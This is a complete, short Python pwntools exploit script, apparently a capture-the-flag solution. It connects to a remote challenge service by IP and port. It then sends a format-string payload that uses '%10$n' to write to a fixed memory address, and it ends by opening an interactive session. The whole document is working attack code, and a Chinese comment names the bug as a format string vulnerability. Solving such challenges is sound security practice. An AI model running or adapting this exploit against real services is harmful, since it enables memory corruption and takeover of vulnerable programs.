from pwn import *

context.log_level = 'DEBUG'

# p = process('../file/e41a0f684d0e497f87bb309f91737e4d')
p = remote('61.147.171.105', '50066')

payload = p32(0x0804a068) + b'aaaa%10$n' # 格式化字符串漏洞
p.sendlineafter(b'name:', 'test')
p.sendlineafter(b'please:', payload)
p.interactive()